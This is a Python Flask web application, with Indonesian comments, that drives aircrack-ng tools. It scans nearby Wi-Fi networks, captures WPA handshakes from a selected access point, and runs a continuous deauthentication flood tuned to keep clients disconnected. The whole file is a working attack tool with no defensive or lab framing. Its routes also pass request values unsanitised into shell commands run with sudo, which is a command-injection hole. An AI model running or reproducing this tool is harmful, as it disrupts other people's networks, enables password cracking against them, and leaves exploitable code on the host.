from flask import Flask, render_template, request, jsonify
import subprocess
import os
import time
import signal
import sys
import re
import atexit
import glob
import threading
import json

app = Flask(__name__)

# Variabel global
monitor_iface = None
original_iface = None
attack_processes = {"sniff": None, "deauth": None}
deauth_thread = None
deauth_running = False
current_target = None

# ====================== FUNGSI MANAJEMEN INTERFACE ======================

def find_wireless_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    lines = result.stdout.split('\n')
    interfaces = []
    for line in lines:
        if "no wireless extensions" in line:
            continue
        if line.strip() and not line.startswith(" "):
            iface = line.split()[0]
            if iface not in ["lo", "eth0", "eth1"]:
                interfaces.append(iface)
    return interfaces

def is_monitor_mode(iface):
    result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
    return "Mode:Monitor" in result.stdout

def start_monitor_mode(iface):
    print(f"[*] Starting monitor mode on {iface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False)
    result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "monitor mode enabled on" in line:
            parts = line.split()
            for i, part in enumerate(parts):
                if part == "on" and i+1 < len(parts):
                    new_iface = parts[i+1].strip()
                    print(f"[+] Monitor interface: {new_iface}")
                    return new_iface
    interfaces = find_wireless_interfaces()
    for i in interfaces:
        if "mon" in i and i != iface:
            print(f"[+] Found monitor interface: {i}")
            return i
    raise RuntimeError("Could not determine monitor interface name")

def stop_monitor_mode(iface):
    if iface and iface != original_iface:
        print(f"[*] Stopping monitor mode on {iface}...")
        subprocess.run(["sudo", "airmon-ng", "stop", iface], check=False)
    print("[*] Restarting NetworkManager...")
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False)

def ensure_monitor_mode():
    global monitor_iface, original_iface
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            monitor_iface = iface
            print(f"[+] Found existing monitor interface: {monitor_iface}")
            return monitor_iface
    for iface in interfaces:
        if not is_monitor_mode(iface) and not iface.startswith("mon"):
            original_iface = iface
            try:
                new_iface = start_monitor_mode(iface)
                monitor_iface = new_iface
                print(f"[+] Successfully created monitor interface: {monitor_iface}")
                return monitor_iface
            except Exception as e:
                print(f"[-] Failed to start monitor on {iface}: {e}")
                continue
    raise RuntimeError("No wireless interface available")

def get_monitor_interface():
    global monitor_iface
    if monitor_iface and is_monitor_mode(monitor_iface):
        return monitor_iface
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            monitor_iface = iface
            return monitor_iface
    return ensure_monitor_mode()

def set_channel(iface, channel):
    try:
        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True, capture_output=True)
        return True
    except:
        return False

# ====================== SIGNAL STRENGTH ======================

def get_signal_level(power):
    """Konversi dBm ke kategori"""
    if power is None:
        return "Almost Hilang"
    if power > -50:
        return "Kuat"
    elif power > -70:
        return "Sedang"
    elif power > -85:
        return "Lemah"
    else:
        return "Almost Hilang"

# ====================== PARSE CSV ======================

def parse_csv(filename):
    """Parse airodump-ng CSV output file, extract BSSID, channel, ESSID, dan Power"""
    networks = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except FileNotFoundError:
        return networks

    start_parsing = False
    for i, line in enumerate(lines):
        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
            start_parsing = True
            continue
        if start_parsing:
            if line.strip() == "" or "station mac" in line.lower():
                break
            parts = line.split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                power_str = parts[8].strip() if len(parts) > 8 else ''
                try:
                    power = int(power_str)
                except:
                    power = None
                if bssid and len(bssid) == 17 and ":" in bssid:
                    networks.append({
                        "bssid": bssid,
                        "channel": channel if channel else "?",
                        "essid": essid if essid else "[Hidden]",
                        "power": power,
                        "signal_level": get_signal_level(power)
                    })
    return networks

# ====================== ROUTE SCAN ======================

@app.route('/scan', methods=['GET'])
def scan_wifi():
    try:
        interface = get_monitor_interface()
        print(f"[*] Scanning with {interface}...")
        
        for f in glob.glob("/tmp/scan_output*.csv"):
            try:
                os.remove(f)
            except:
                pass
        
        cmd = f"timeout 12 sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
        subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        possible_files = [
            "/tmp/scan_output-01.csv",
            "/tmp/scan_output-02.csv",
            "/tmp/scan_output-03.csv",
            "/tmp/scan_output.csv"
        ]
        
        networks = []
        for f in possible_files:
            if os.path.exists(f):
                print(f"[*] Parsing file: {f}")
                networks = parse_csv(f)
                if networks:
                    break
        
        if networks:
            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
            print(f"[+] Found {len(networks)} networks")
            return jsonify({"status": "success", "networks": networks})
        else:
            print("[*] No networks found in CSV, using fallback method...")
            cmd2 = f"timeout 8 sudo airodump-ng {interface} 2>/dev/null | grep -E '^[0-9A-F]' | head -20"
            result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
            lines = result2.stdout.split('\n')
            for line in lines:
                parts = line.split()
                if len(parts) >= 7:
                    bssid = parts[0]
                    channel = parts[2] if len(parts) > 2 else "?"
                    essid = " ".join(parts[6:]) if len(parts) > 6 else "[Hidden]"
                    if bssid and len(bssid) == 17 and ":" in bssid:
                        networks.append({
                            "bssid": bssid,
                            "channel": channel,
                            "essid": essid,
                            "power": None,
                            "signal_level": "Almost Hilang"
                        })
            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
            return jsonify({"status": "success", "networks": networks})
            
    except Exception as e:
        print(f"[-] Error during scan: {e}")
        return jsonify({"status": "error", "message": str(e)})

# ====================== ROUTES SERANGAN ======================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_sniff', methods=['POST'])
def start_sniff():
    data = request.json
    bssid = data.get('bssid')
    channel = data.get('channel')
    interface = get_monitor_interface()
    if not interface:
        return jsonify({"status": "error", "message": "Monitor interface not found"})
    
    stop_sniff_process()
    cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w captured_handshake {interface}"
    process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
    attack_processes["sniff"] = process
    return jsonify({"status": "success", "message": f"Sniffing started on {bssid}"})

@app.route('/stop_sniff', methods=['POST'])
def stop_sniff():
    stop_sniff_process()
    return jsonify({"status": "success", "message": "Sniffing stopped"})

def stop_sniff_process():
    if attack_processes["sniff"]:
        os.killpg(os.getpgid(attack_processes["sniff"].pid), signal.SIGTERM)
        attack_processes["sniff"] = None

# ====================== DEAUTH OPTIMIZED - 10 PACKETS PER SECOND ======================

def deauth_loop_single(target, interface):
    """
    Deauth loop optimized:
    - 10 paket per detik (2 burst x 5 paket)
    - Ringan di CPU VM
    - Tetap efektif memutuskan koneksi
    """
    global deauth_running, current_target
    bssid = target['bssid']
    channel = target['channel']
    essid = target.get('essid', 'Unknown')
    
    print(f"[*] Starting deauth on {bssid} (CH {channel}) - {essid}")
    print(f"[*] Rate: 10 packets/second (2 bursts x 5 packets)")
    
    # Set channel ke target
    set_channel(interface, channel)
    
    # Statistik
    packet_count = 0
    attack_rounds = 0
    start_time = time.time()
    
    # Konfigurasi: 10 paket/detik
    BURST_SIZE = 5      # 5 paket per burst
    BURSTS_PER_SECOND = 2  # 2 burst per detik = 10 paket/detik
    
    while deauth_running:
        attack_rounds += 1
        
        # Kirim burst 1
        cmd1 = f"sudo aireplay-ng --deauth {BURST_SIZE} -a {bssid} {interface}"
        try:
            subprocess.run(cmd1, shell=True, timeout=1, capture_output=True, text=True)
            packet_count += BURST_SIZE
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            print(f"[-] Error in deauth burst 1: {e}")
        
        # Cek apakah masih running
        if not deauth_running:
            break
        
        # Delay 0.5 detik (setengah detik)
        time.sleep(0.5)
        
        # Kirim burst 2
        cmd2 = f"sudo aireplay-ng --deauth {BURST_SIZE} -a {bssid} {interface}"
        try:
            subprocess.run(cmd2, shell=True, timeout=1, capture_output=True, text=True)
            packet_count += BURST_SIZE
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            print(f"[-] Error in deauth burst 2: {e}")
        
        # Delay 0.5 detik lagi (total 1 detik per cycle)
        time.sleep(0.5)
        
        # Log setiap 10 cycle (10 detik)
        if attack_rounds % 10 == 0:
            elapsed = time.time() - start_time
            avg_rate = packet_count / elapsed if elapsed > 0 else 0
            print(f"[*] Cycle {attack_rounds} | Total packets: {packet_count} | Rate: {avg_rate:.1f} pkts/sec")
    
    elapsed = time.time() - start_time
    avg_rate = packet_count / elapsed if elapsed > 0 else 0
    print(f"[*] Deauth stopped. Total: {packet_count} packets in {elapsed:.1f}s ({avg_rate:.1f} pkts/sec)")

@app.route('/start_deauth', methods=['POST'])
def start_deauth():
    global deauth_thread, deauth_running, current_target
    data = request.json
    targets = data.get('targets')
    
    if not targets or len(targets) == 0:
        return jsonify({"status": "error", "message": "No targets selected"})
    
    # Ambil target pertama saja (single target)
    target = targets[0]
    current_target = target
    
    interface = get_monitor_interface()
    if not interface:
        return jsonify({"status": "error", "message": "Monitor interface not found"})
    
    # Stop deauth yang sedang berjalan
    stop_deauth_process()
    
    # Start deauth baru
    deauth_running = True
    deauth_thread = threading.Thread(target=deauth_loop_single, args=(target, interface))
    deauth_thread.daemon = True
    deauth_thread.start()
    
    return jsonify({
        "status": "success", 
        "message": f"Deauth started on {target['bssid']} (CH {target['channel']}) - 10 packets/sec",
        "target": target
    })

@app.route('/stop_deauth', methods=['POST'])
def stop_deauth():
    stop_deauth_process()
    return jsonify({"status": "success", "message": "Deauth stopped"})

def stop_deauth_process():
    global deauth_running, deauth_thread, current_target
    deauth_running = False
    if deauth_thread and deauth_thread.is_alive():
        deauth_thread.join(timeout=3)
    deauth_thread = None
    current_target = None
    
    # Matikan semua proses aireplay-ng yang mungkin masih berjalan
    subprocess.run("sudo pkill -f 'aireplay-ng --deauth'", shell=True, check=False)

# ====================== GET CURRENT TARGET ======================

@app.route('/current_target', methods=['GET'])
def get_current_target():
    global current_target
    if current_target and deauth_running:
        return jsonify({
            "status": "running",
            "target": current_target
        })
    else:
        return jsonify({
            "status": "idle",
            "target": None
        })

# ====================== CLEANUP ======================

def cleanup():
    print("\n[*] Cleaning up...")
    stop_sniff_process()
    stop_deauth_process()
    if monitor_iface:
        stop_monitor_mode(monitor_iface)
    print("[+] Cleanup complete.")

def signal_handler(sig, frame):
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)

# ====================== MAIN ======================

if __name__ == '__main__':
    try:
        ensure_monitor_mode()
        print(f"[*] Monitor interface ready: {monitor_iface}")
        print("[*] Starting Flask server on 0.0.0.0:5000 ...")
        app.run(host='0.0.0.0', port=5000, debug=False)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        cleanup()
        sys.exit(1)